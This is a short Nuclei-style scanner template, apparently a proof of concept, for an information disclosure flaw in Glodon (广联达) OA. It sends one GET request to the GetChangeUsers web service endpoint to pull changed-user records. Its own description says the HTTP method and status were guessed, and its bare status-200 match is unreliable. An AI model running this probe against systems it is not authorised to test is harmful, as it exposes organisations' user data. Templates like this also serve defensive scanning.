id: poc-267d6eeccdd1d1b3f448
info:
  name: 广联达OAGetChangeUsers存在信息漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: other,2025
http:
- raw:
  - 'GET /Org/service/Service.asmx/GetChangeUsers?strDate=2023-01-02 HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
